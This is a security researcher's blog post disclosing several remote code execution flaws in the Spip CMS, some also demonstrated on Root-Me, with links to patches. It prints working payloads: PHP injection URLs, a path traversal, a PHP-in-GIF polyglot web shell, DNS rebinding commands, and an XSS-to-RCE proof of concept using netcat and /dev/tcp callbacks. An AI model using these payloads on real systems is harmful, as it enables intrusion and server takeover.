@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <script async src="/js/custom.js"></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
+<meta name="generator" content="Hugo 0.57.2" />
+
+    
+    
+    
+
+<title>RCE on Spip and Root-Me, v2! • Think
+Love
+Share</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RCE on Spip and Root-Me, v2!"/>
+<meta name="twitter:description" content="Some more 0-day research done on Spip, includes preauth and postauth RCE. We&#39;re also welcoming our first guest-writer t0 that will introduce another post-auth RCE he found! Disclosing a bit late but hey, now it&#39;s there! :)"/>
+
+<meta property="og:title" content="RCE on Spip and Root-Me, v2!" />
+<meta property="og:description" content="Some more 0-day research done on Spip, includes preauth and postauth RCE. We&#39;re also welcoming our first guest-writer t0 that will introduce another post-auth RCE he found! Disclosing a bit late but hey, now it&#39;s there! :)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me_v2/" />
+<meta property="article:published_time" content="2022-08-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-16T00:00:00+00:00" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container sidebar-about ">
+      <span class="site__title">
+        <a href="https://thinkloveshare.com/">Think
+Love
+Share</a>
+      </span>
+          <a href="https://thinkloveshare.com/">
+          
+          
+          
+          <div class="author-image">
+            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+      <p class="site__description">
+        <a href="https://thinkloveshare.com/">
+         InfoSec, Code, Thoughts &amp; Feels 
+      </a>
+      </p>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/hacking/">
+						<span>Hacking</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/coding/">
+						<span>Coding</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/the_rest/">
+						<span>The Rest</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/travels/">
+						<span>Travels</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+  
+</section>
+
+    </p>
+    <p class="copyright">
+      &copy; 2022 Laluka.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>RCE on Spip and Root-Me, v2!</h1>
+    
+    
+<div class="post__meta">
+    
+      <i class="fas fa-calendar-alt"></i> Aug 16, 2022
+    
+    
+    <i class="fas fa-clock"></i> 13 min read
+    <i class="fas fa-globe"></i>
+    
+    Non traduit
+    
+    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
+</div>
+
+
+  </header>
+  <hr/>
+  <div class="post">
+    
+
+<p>Hello there,<br />
+This is the second article dedicated to <a href="https://www.spip.net/">Spip</a> 0-day research, if you haven&rsquo;t read the first one, I recommend <a href="/hacking/rce_on_spip_and_root_me/">reading it first</a>. Even though it&rsquo;s not required to follow along, it&rsquo;s always better to have the full context for a specific research. Here, I won&rsquo;t detail again the setup process, we&rsquo;ll just go through issues from the past, and the newly found issues!</p>
+
+<p>Oh, and if you&rsquo;re here wondering if these issues were generic enough to break into <a href="https://www.root-me.org/">Root-Me</a> again&hellip; Yup, they were! :)</p>
+
+<p>I&rsquo;ll keep this line from the first article: <strong>Welcome. To. Php.</strong></p>
+
+<p><img class="img_med" src="sparta_php.jpg" alt="sparta_php"></p>
+
+<h1 id="past-research">Past research</h1>
+
+<p>This list definitely won&rsquo;t be exhaustive as many issues are silently patched, and there is just too much content to cover it all. Therefore we&rsquo;ll just focus on a few issues that reflect what can be found. If you want a more detailed list, head out to <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-3769/Spip.html">CVEdetails - Spip</a>!</p>
+
+<h2 id="2009-cfreal-https-twitter-com-cfreal">2009 - <a href="https://twitter.com/cfreal_">@cfreal_</a></h2>
+
+<p>Deadly and efficient, php code injection in a GET parameter, that is probably reflected later in an <code>eval</code> statement or dynamically generated php file.</p>
+
+<p><code>/spip.php?page=poster&amp;id_article=1'.system('pwd').'</code></p>
+
+<h2 id="2011-blaklis-https-twitter-com-blaklis-matsuyama">2011 - <a href="https://twitter.com/Blaklis_">@Blaklis_</a> &amp; Matsuyama</h2>
+
+<p><a href="https://www.orange-business.com/fr/blogs/securite/securite-applicative/1er-challenge-pirate-moicom-5h-ont-suffi">https://www.orange-business.com/fr/blogs/securite/securite-applicative/1er-challenge-pirate-moicom-5h-ont-suffi</a></p>
+
+<p>No payload to give here, but after a quick chat, the main goal was to deface the site, which was done with an auth bypass and a stored xss.</p>
+
+<p>Yet it&rsquo;s interesting to know that Orange was (actually is on some subdomains, but shhh) relying on Spip!</p>
+
+<h2 id="2011-essandre">2011 - EsSandre</h2>
+
+<p>A dead-simple example of file read, ahhh&hellip; 2011&hellip; I miss you!</p>
+
+<p><code>/squelettes/script/protection_acces_http.php?file=../../../../../../../etc/passwd</code></p>
+
+<h2 id="2019-thelaluka-https-twitter-com-thelaluka">2019 - <a href="https://twitter.com/TheLaluka">@TheLaluka</a></h2>
+
+<p>A few XSS (leading to RCE), two SQLi (leading to RCE through session hijacking, admin hash cracking), and a post-auth remote code execution, once again, reflected php code in eval!</p>
+
+<p><a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/</a></p>
+
+<h2 id="2020-coiffeur0x90-https-twitter-com-coiffeur0x90">2020 - <a href="https://twitter.com/Coiffeur0x90">@Coiffeur0x90</a></h2>
+
+<p>Two examples of reflected php code inside eval statements. Any user can modify its own display properties or cookie values. If register is enabled, then it can even be considered as a preauth-rce.</p>
+
+<p><a href="https://therealcoiffeur.github.io/c11000">https://therealcoiffeur.github.io/c11000</a> <br />
+<a href="https://therealcoiffeur.github.io/c11001">https://therealcoiffeur.github.io/c11001</a></p>
+
+<h2 id="2022-spawnzii-https-twitter-com-spawnzii">2022 - <a href="https://twitter.com/SpawnZii">@SpawnZii</a></h2>
+
+<p>In the first article I wrote about Spip, my last words were something like this:</p>
+
+<blockquote>
+<p>This patch isn&rsquo;t right&hellip; Please someone, break it!</p>
+</blockquote>
+
+<p>And someone did: <a href="https://twitter.com/SpawnZii">@SpawnZii</a>! ^.^</p>
+
+<p>He basically used the same bug, but extended the base64 payload with injected raw php code. Smart move, works like a charm! :)</p>
+
+<p><code>/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;?php system('id');?&gt;</code></p>
+
+<p><a href="https://spawnzii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/">https://spawnzii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/</a></p>
+
+<h1 id="fresh-rce-what-you-re-here-for">Fresh RCE | What you&rsquo;re here for!</h1>
+
+<h2 id="preauth-custom-ssti-on-icalendar-generation">Preauth custom SSTI on icalendar generation</h2>
+
+<p><img class="img_med" src="meme-rce-day.png" alt="meme-rce-day"></p>
+
+<p>The first RCE I&rsquo;ll introduce here, is one that I found quite some time ago, and it has been &ldquo;patched&rdquo; while updating the codebase, it&rsquo;s not a security fix, it&rsquo;s just&hellip; Random luck I guess!</p>
+
+<p>Here&rsquo;s the final payload, but what? Why? How?</p>
+
+<p><code>/spip.php?page=ical_prive&amp;statut='=='foo'){echo(42);};}else{system('id');};if(false){if('foo</code></p>
+
+<p>In its custom templating engine, the Spip framework makes use of code snippets like <code>&lt;/BOUCLE0&gt;&lt;BOUCLE0 {PARAMS} &gt;</code>, this will be parsed in a specific way and populated. It seems safe in many ways as the populated variables aren&rsquo;t supposed to be user controlled, and angle brackets &lt; and &gt; are escaped. But a code refactoring that happened in January 2018 changed the way <code>statut</code> was populated, and it was then possible to use an array merge taking place beforehand to takeover this variable. The template would then be rendered with user-controlled values. The fact that the content was placed directly in a php if condition allowed the execution of php code without angle brackets, it was only required to escape the single quotes, fix the context to have a valid php syntax within the eval call, and inject the right payload.</p>
+
+<p>Content of <code>./spip/prive/ical_prive.html</code>:</p>
+
+<pre><code class="language-php">&lt;BOUCLE0(AUTEURS){tout}{id_auteur}{lang_select}&gt;&lt;?php
+if ('[(#ID_AUTEUR|securiser_acces{#ENV{arg},ical})]' OR /* spip &lt; 1.9 */
+	'[(#ID|securiser_acces{#ENV{cle},ical})]') {
+?&gt;#HTTP_HEADER{Content-Type: text/calendar}
+#HTTP_HEADER{Content-Disposition: attachment; filename=#NOM_SITE_SPIP|textebrut|replace{\W,'_'}|concat{_prive.ics}}
+#CACHE{0}
+BEGIN:VCALENDAR
+CALSCALE:GREGORIAN
+--[SNIP]--
+UID:message#ID_MESSAGE @ [(#URL_SITE_SPIP|filtrer_ical)]
+DTSTAMP:[(#DATE_HEURE|date_ical)]
+DTSTART:[(#DATE_HEURE|date_ical)]
+CATEGORIES:&lt;:info_message_2|filtrer_ical:&gt;
+URL:[(#URL_ECRIRE*{message, id_message=#ID_MESSAGE})]
+&lt;BOUCLE_message_n_a(AUTEURS auteurs_messages){lang_select=non}{id_message}&gt;[(#ID_AUTEUR
+|=={#ENV{id_auteur}}|?{ORGANIZER,ATTENDEE})]:[(#NOM|filtrer_ical)][ &lt;(#EMAIL|filtrer_ical)&gt;]
+&lt;/BOUCLE_message_n_a&gt;END:VTODO&lt;/BOUCLE_message_n&gt;
+&lt;?php
+	if ('#0:STATUT' == '0minirezo') {           // Injection here
+?&gt;&lt;BOUCLE_forum(FORUMS?){par date}{inverse}{tout}{statut=&quot;prop&quot;}&gt;
+--[SNIP]--
+</code></pre>
+
+<p>Once rendered, the template gave the following php code:</p>
+
+<pre><code class="language-php">--[SNIP]--
+&lt;?php
+if ('[(#ID_AUTEUR|securiser_acces{#ENV{arg},ical})]' OR '[(#ID|securiser_acces{#ENV{cle},ical})]') {
+	if (''=='foo'){
+        echo(42);
+    }
+} else {
+    system('id');
+};
+if(false){if('foo' == '0minirezo') {
+--[SNIP]--
+</code></pre>
+
+<p>What can be seen here is that this injection is powerful enough so we can bypass the <code>securiser_acces</code> check by closing the initial if statement and appending our payload after all the security checks failed!</p>
+
+<pre><code class="language-bash">curl -gsk &quot;http://127.0.0.1/spip.php?page=ical_prive&amp;statut=%27%3D%3D%27foo%27%29%7Becho%2842%29%3B%7D%3B%7Delse%7Bsystem%28%27id%27%29%3B%7D%3Bif%28false%29%7Bif%28%27foo&quot; | grep uid=
+# }?&gt;&lt;/BOUCLE0&gt;&lt;BOUCLE0(AUTEURS){tout}{id_auteur}{lang_select}&gt;uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),998(docker)
+</code></pre>
+
+<p>Patch: <a href="https://github.com/spip/SPIP/commit/71a7d1353ae8ff8335db4051df922276109a4a62">https://github.com/spip/SPIP/commit/71a7d1353ae8ff8335db4051df922276109a4a62</a></p>
+
+<p>I&rsquo;m not sure about its current exploitability, the Spip team says it&rsquo;s safe now, I took their word and did not spend more time on it.</p>
+
+<p>It is to note that this endpoint is visible from the admin/author interface, but it&rsquo;s not referenced without authentication. Moreover, for some reasons it wasn&rsquo;t catched by my numerous crawls. I found it while being logged-out, with a custom wordlist of every existing file (<code>find . -type f -iname &quot;*.php&quot;</code>) and every word (<code>grep -hrioP '[a-zA-Z0-9_]+' | sort -uV -o spip-words.lst</code>) I could find in the repo matched against the main parameters of this application (extracted with my crawler). The wordlist was generated with the source of the website after some time being in use to take into account custom content, user-related dynamically generated variables, end cache-files written to disk.</p>
+
+<h2 id="postauth-email-content-eval">Postauth email content eval</h2>
+
+<p>This one is quite easy to trigger, but doesn&rsquo;t work at every try. I&rsquo;m not really sure why, most likely caching in place, or rate-limit on the number of emails sent.. Might also be related to the job in charge of sending emails, but same here, I did not investigate further.</p>
+
+<ol>
+<li>Login as author</li>
+<li>Create section that will contain our article</li>
+<li>Create article with the title: <code>&lt;?php system(&quot;id | nc 127.0.0.1 8000&quot;);?&gt;</code></li>
+<li>Change article status from draft to evaluation</li>
+<li>Enjoy your RCE!</li>
+</ol>
+
+<p>It is to note that the RCE might be a blind one depending on your setup, the command result can be sent to your public IP or even received by email! :D</p>
+
+<p>Fun fact: I knew that Spip really suffers from <code>too many evals</code>, so instead of reading code, I just sent similar payloads all over the place, and used my fork of php that contains builtin introspection, this tool should be made public for Rump In Rennes in October 2022! ;)</p>
+
+<p>It took only a few forms to trigger the eval statement with the unsanitized title and content reflected in the evaled content.</p>
+
+<p><img class="img_small" src="meme-eval-and-go.png" alt="memememe-eval-and-go"></p>
+
+<p>Here are the screenshots of the same issue exploited (<strong>WITH THEIR CONSENT</strong>) on <a href="https://www.root-me.org/">Root-Me</a>!</p>
+
+<p>Initial article creation and status change:</p>
+
+<p><img class="img_full" src="rce1-rootme-payload.png" alt="rce1-rootme-payload"></p>
+
+<p>Email received for the status change:</p>
+
+<p><img class="img_full" src="rce1-rootme-email.png" alt="rce1-rootme-email"></p>
+
+<p>DNS callbacks for the executed payload:</p>
+
+<p><img class="img_full" src="rce1-rootme.png" alt="rce1-rootme"></p>
+
+<h2 id="postauth-code-injection-in-mediabox-as-a-webmestre">Postauth code injection in MediaBox as a WebMestre</h2>
+
+<p>This RCE is mostly useless because as a webmestre (read superadmin), it is already possible to upload new modules and get code execution this way, but hey, it&rsquo;s still a post-auth RCE bug that qualifies! :)</p>
+
+<p><img class="img_med" src="meme-rce-webmestre.png" alt="meme-rce-webmestre"></p>
+
+<p>While visiting <code>/ecrire/?exec=configurer_mediabox</code>, it was possible to change the appearance of images on the website for all users. Many parameters suffered from the same code injection. This attack can be done from the browser, it only requires the attacker to change the width for pictures from <code>600px</code> to <code>600px&quot;;//&lt;?php if(isset($_GET['cmd'])) { system($_GET['cmd']); }?&gt;</code>. Then, visit the following page: <code>/ecrire/?exec=navigation&amp;menu=menu_edition&amp;cmd=id</code></p>
+
+<p>Patch: <a href="https://git.spip.net/spip/mediabox/commit/d3f311ce800d533053bc66b357e26881d930bcc7">https://git.spip.net/spip/mediabox/commit/d3f311ce800d533053bc66b357e26881d930bcc7</a></p>
+
+<p>One more cool trick is that even though this is only reachable as a webmestre, if an attacker is able to read files on the remote server, leaking the site secret key is enough to forge the same payload and submit it with author rights! But it&rsquo;s patched now, so this <code>was</code> a cool trick.. :x</p>
+
+<p>Injection point in the MediaBox page:</p>
+
+<p><img class="img_med" src="rce-mediabox.png" alt="rce-mediabox"></p>
+
+<h2 id="postauth-php-file-upload-t0">Postauth php file upload // t0</h2>
+
+<p>Hey folks! It seems it&rsquo;s my turn to introduce another RCE here!</p>
+
+<p><img class="img_med" src="bugs-bunny.jpg" alt="bugs-bunny"></p>
+
+<p>After some time spent digging around and finding a few XSS where inputs were not filtered correctly, I decided to search for more exciting vulnerabilities.</p>
+
+<p>There&rsquo;s an upload functionality available on the Spip panel, and I love to spend time on this kind of feature. So I started to test it and quickly found an XSS when hiding javascript code inside an SVG picture, but hey, this is not enough!</p>
+
+<p>It was possible to upload PHP files as well, but the checks made on the server side were good enough to prevent php execution, and render them as text, so no RCE there. But we saw that it was possible to inject javascript inside an SVG file, so why can&rsquo;t we try to inject PHP code inside a picture?</p>
+
+<p>Spip accepts SVG, JPEG, GIF and PNG formats. After trying classic techniques, a friend of mine (thanks to <a href="https://twitter.com/THB_STX">Semtex</a>) suggested that I take a look at polyglot files.</p>
+
+<p>Indeed, there are plenty of ways to hide PHP code inside a picture! After finally finding one way to do it successfully on Spip, I was then able to do it using various picture formats generated with multiple techniques.</p>
+
+<p>Let&rsquo;s introduce the GIF comment extension section which (finally!) leads to an RCE!</p>
+
+<p><img class="img_med" src="gif-jif.gif" alt="gif-jif"></p>
+
+<p>One of the <code>GIF89</code> extension types is the <code>comment</code> extension. This allows you to embed ASCII text in a GIF file, and is sometimes used to include an image description, image credit, or other human-readable metadata such as the GPS location of the image capture.</p>
+
+<p><img class="img_med" src="gif-format.gif" alt="gif-format"></p>
+
+<p>The first byte is the extension introducer which is <code>0x21</code>. The next byte is always <code>0xFE</code> which is the comment label. Then we jump right to the data sub-blocks containing ASCII character codes for your comment. The final byte, <code>0x00</code>, indicates a sub-block with zero bytes, which is in fact the end of the block.</p>
+
+<p>More information on the GIF file format here:<br />
+<a href="http://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html#comment_extension_block">http://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html#comment_extension_block</a></p>
+
+<p>Let&rsquo;s examine our malicious file&rsquo;s content:</p>
+
+<pre><code>00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
+00000010  00 00 01 00 01 00 00 02  00 21 fe 1d 3c 3f 70 68  |.........!..&lt;?ph|
+00000020  70 20 73 79 73 74 65 6d  28 24 5f 53 45 52 56 45  |p system($_SERVE|
+00000030  52 5b 27 48 54 54 50 5f  74 30 27 5d 29 3b 3f 3e  |R['HTTP_t0']);?&gt;|
+00000040  00 0a                                             |..|
+</code></pre>
+
+<p>You can see that it&rsquo;s a valid GIF file, it starts the comment extension block (<code>0x21FE</code>), specifies the size of the block (<code>0x1D</code> == <code>29</code> in decimal), and ends it using <code>0x00</code>. So what happens if PHP code is written inside the comment extension&rsquo;s data sub-blocks in a GIF file?</p>
+
+<p>As double extensions were allowed on Spip, this leads to our Holy Grail!</p>
+
+<p>We first upload our payload at <code>/ecrire/?exec=article_edit&amp;new=oui</code>, and then navigate to <code>/IMG/gif/image.php.gif</code>. All we have to do is to add a custom header <code>t0</code> with the command to execute on the server.</p>
+
+<p><img class="img_med" src="file-upload.png" alt="file-upload"></p>
+
+<pre><code class="language-bash">curl http://127.0.0.1/IMG/gif/image.php.gif -H &quot;t0: whoami&quot;
+# http
+</code></pre>
+
+<p>I was able to hide the payload and exploit the vulnerability using <code>PNG with IDAT and PLTS chunks</code>, <code>GIF with comments and global color table</code>, etc.</p>
+
+<p>If you are interested in this kind of exploitation, here are some very nice resources I found:</p>
+
+<ul>
+<li><a href="https://blog.isec.pl/injection-points-in-popular-image-formats/">https://blog.isec.pl/injection-points-in-popular-image-formats/</a></li>
+<li><a href="https://virtualabs.fr/Nasty-bulletproof-Jpegs-l.html">https://virtualabs.fr/Nasty-bulletproof-Jpegs-l.html</a></li>
+<li><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></li>
+</ul>
+
+<p>Patches:</p>
+
+<ul>
+<li><a href="https://git.spip.net/spip/spip/commit/1cf91def15966406ddd0488cf9d1ecd1ae82d47a">https://git.spip.net/spip/spip/commit/1cf91def15966406ddd0488cf9d1ecd1ae82d47a</a></li>
+<li><a href="https://git.spip.net/spip/spip/commit/1cf91def15966406ddd0488cf9d1ecd1ae82d47a">https://git.spip.net/spip/spip/commit/1cf91def15966406ddd0488cf9d1ecd1ae82d47a</a></li>
+</ul>
+
+<h3 id="bonus-dns-rebinding-on-the-file-upload-feature-t0">Bonus - DNS Rebinding on the file upload feature // t0</h3>
+
+<p>Sorry if you only want to hear about RCEs, this is not one of them! But it&rsquo;s still a cool one in my opinion, which can lead to juicy findings depending on the environment used! :)</p>
+
+<p>When using the file upload functionality, it is also possible to specify an URL. First thing we want to try in this case is an SSRF. But looking at the source code, there&rsquo;s a blacklist related to local IPs (127.0.0.1, and addresses within the A/B/C classes). Moreover, the server resolves the URL before checking if it does not belong to one of these classes (function <code>valider_url_distante</code> in <code>ecrire/inc/distant.php</code>):</p>
+
+<p><img class="img_full" src="dns-rebind-code.png" alt="dns-rebind-code"></p>
+
+<p>However, once the check is passed, another request is made to download the file, and this time without any security check left. That&rsquo;s where the <code>DNS rebinding</code> technique can be used!</p>
+
+<p><img class="img_med" src="its-always-dns.png" alt="its-always-dns"></p>
+
+<p>DNS rebinding is an attack in which the attacker initiates repeated DNS queries to a domain under their control.</p>
+
+<p>The first query returns a valid response that passes security checks, while subsequent queries return a malicious response that targets the internal network. Thus, it is possible to initiate a first request pointing to an URL/IP authorized by the application, and then the second to an unauthorized URL/IP.</p>
+
+<p>During the first check, the response points to a public IP address, then when the download is done, it points to 127.0.0.1.</p>
+
+<p>I was first able to exploit it by sending multiple requests to an URL crafted thanks to online DNS rebinding services, then I found a very nice tool to automate the this attack and control the process without external dependencies: <a href="https://github.com/iphelix/dnschef">dnschef</a></p>
+
+<p>Git clone it, replace the <code>dnschef.py</code> with <a href="https://github.com/iphelix/dnschef/blob/b68c0f8bb61cececfda90016d4d81ef800ec3c29/dnschef.py">this one</a>. Then it&rsquo;s as easy as this:</p>
+
+<pre><code class="language-bash">while true; do
+  ./dnschef.py --interface &lt;ip_listening_dns_request&gt; --fakedomains &lt;domain_controlled&gt; --fakeip 8.8.8.8 --count 2
+  ./dnschef.py --interface &lt;ip_listening_dns_request&gt; --fakedomains &lt;domain_controlled&gt; --fakeip 127.0.0.1 --count 2
+done
+</code></pre>
+
+<p>It will resolve 2 times the public IP, then 2 times <code>127.0.0.1</code> then public IP again, looping forever.</p>
+
+<blockquote>
+<p>Small lalu-trick here, if the site uses MySQL without authentication &ldquo;because it listens on the loopback only&rdquo;, RCE can be achieved using this DNS debinding to have a mixed-protocol SSRF. It will first push some garbage bytes to MySQL which will whine a bit, but if you have SQL commands surrounded by newline bytes, they will be executed. So it can be used to peek and poke in the database, leading to remote code execution! :}</p>
+</blockquote>
+
+<h1 id="some-thoughts">Some thoughts</h1>
+
+<h2 id="sqli-rce">SQLI == RCE</h2>
+
+<p>If you have an SQL injection on Spip, it is enough to:</p>
+
+<ol>
+<li>List the users, find who is the webmestre and the associated email</li>
+<li>Use the password reset feature (no bug required)</li>
+<li>Use the SQL injection to read the secret code used to verify the reset request</li>
+<li>Change the webmestre&rsquo;s password</li>
+<li>Login as a webmestre and upload a new module that includes attacker controlled code</li>
+</ol>
+
+<p>So any SQL has the same impact as a direct RCE.</p>
+
+<h2 id="xss-to-rce">XSS to RCE</h2>
+
+<p>Any stored XSS that can be triggered without overcomplicated social engineering should also be considered as an &ldquo;almost direct RCE&rdquo;.</p>
+
+<ol>
+<li>Store your XSS payload</li>
+<li>The XSS payload must:
+
+<ol>
+<li>Verify that only webmestre / admins are targeted</li>
+<li>Make the async requests from the webmestre or admin session</li>
+<li>Create a new admin user</li>
+</ol></li>
+<li>With the newly acquired admin account, upload a backdoored module</li>
+</ol>
+
+<p>Here is the code I wrote something like 2 years ago to exploit the MediaBox issue through an XSS. The code is a bit messy but it works! :)</p>
+
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;PoC XSS to RCE Spip 3.3-dev&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;script&gt;
+    fetch(&quot;ecrire/?exec=configurer_mediabox&quot;)
+      .then(res =&gt; {
+        return res.text();
+      })
+      .then(page =&gt; {
+        console.log(page);
+        page = page.replace(/(\r\n|\n|\r)/gm, &quot;&quot;);
+        forms = page.match(/&lt;form.*?&lt;\/form&gt;/g);
+
+        forms.forEach(form =&gt; {
+          if (form.includes('action=&quot;/ecrire/?exec=configurer_mediabox&quot;')) {
+            form_configurer_mediabox = form;
+
+          }
+          console.log(form);
+        });
+
+        if (typeof form_configurer_mediabox == 'undefined') {
+          alert(&quot;Exploit failed&quot;);
+        }
+
+        console.log(form_configurer_mediabox);
+        dom = new DOMParser().parseFromString(form_configurer_mediabox, &quot;text/html&quot;);
+        form = new FormData(dom.forms[0]);
+        payload = &quot;\&quot;;//&lt;?php if(isset($_GET['cmd'])) { system($_GET['cmd']); }?&gt;&quot;;
+        form.set(&quot;splash_width&quot;, form.get(&quot;splash_width&quot;) + payload);
+        fetch(&quot;/ecrire/?exec=configurer_mediabox&quot;, {
+          method: &quot;POST&quot;,
+          body: form
+        });
+        cmd = &quot;bash -c 'id &gt; /dev/tcp/127.0.0.1/8000'&quot;
+        fetch(&quot;/?cmd=&quot; + cmd, {});
+        // Clean payload here if needed
+      });
+
+  &lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+
+<h2 id="file-read-rce">File read = RCE</h2>
+
+<p>Reading files also has a deep and powerful impact.</p>
+
+<p>If the site uses SQLite, as explained earlier, it&rsquo;s an instant game-over as the attacker can retrieve password reset tokens.</p>
+
+<p>If the site uses a regular SQL database, it&rsquo;s still possible to read the site secret key and forge evil payloads at many places. I won&rsquo;t give details here as it&rsquo;s not something they can really protect against. But if you need it someday, now you know it&rsquo;s doable! :)</p>
+
+<h1 id="conclusion-kudos">Conclusion &amp; Kudos</h1>
+
+<p>Now more than ever, I&rsquo;m confident saying that not all languages are equal toward security.<br />
+Especially, languages that mix file system, code, and routing (php, asp, jsp, and others using dynamic reloading). They really seem to offer/expose an extra-wide attack surfaces that developers aren&rsquo;t aware of.</p>
+
+<p>We&rsquo;re applying patches to fix the consequences of poor choices from the past (no shame here, they were relevant in their time!). <strong>If</strong> security really is a concern, maybe now is the right time to drop dangerous pieces of code and features we keep for retrocompatibility&hellip; Or switch to cleaner &amp; safer language!</p>
+
+<p><img class="img_med" src="meme-improve-security.png" alt="meme-improve-security"></p>
+
+<p>That being said, if you <strong>really</strong> want or need to keep using php but also require a decent level of security, please consider using <a href="https://snuffleupagus.readthedocs.io/">Snuffleupagus</a>! It gets rid of whole classes of bugs by patching php&rsquo;s bytecode at the right places. The performance overhead is low, the security gain high, and reliability really seems to be kept in mind!</p>
+
+<p>Kudos to all the past researchers, and a kind shout-out to <a href="https://twitter.com/___t0___"><strong><em>t0</em></strong></a> for sharing his findings with us!<br />
+Have a nice week, and see you soon for more tooling and research! ;)</p>
+
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/hacking/1001_ways_to_pwn_prod/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">1001 ways to PWN prod - A tale of 60 RCE in 60 minutes</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-128985075-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
